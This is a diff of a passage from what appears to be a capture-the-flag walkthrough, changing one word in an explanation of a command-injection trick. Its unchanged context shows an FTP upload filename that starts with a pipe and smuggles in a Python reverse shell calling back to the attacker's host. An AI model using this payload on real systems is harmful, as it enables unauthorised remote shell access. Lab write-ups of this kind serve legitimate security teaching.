@@ -503,7 +503,7 @@ To exploit this we need our file to be called this once it's uploaded via ftp:
 "|python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"10.10.14.239\",1338));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call([""\"sh\",""\"-i\"])';.csv"
 ```
 
-Notice the first character is the | then the code after gets executed. Which for the above will use Python to open that shell back to us on Kali. Also see that I've had to do an number of extra backslashes to ensure special characters are processed properly.
+Notice the first character is the pipe then the code after gets executed. Which for the above will use Python to open that shell back to us on Kali. Also see that I've had to do an number of extra backslashes to ensure special characters are processed properly.
 
 With that command changed to have our Kali tun0 IP and port we just paste it in as part of the put command. First log in to FTP:
 
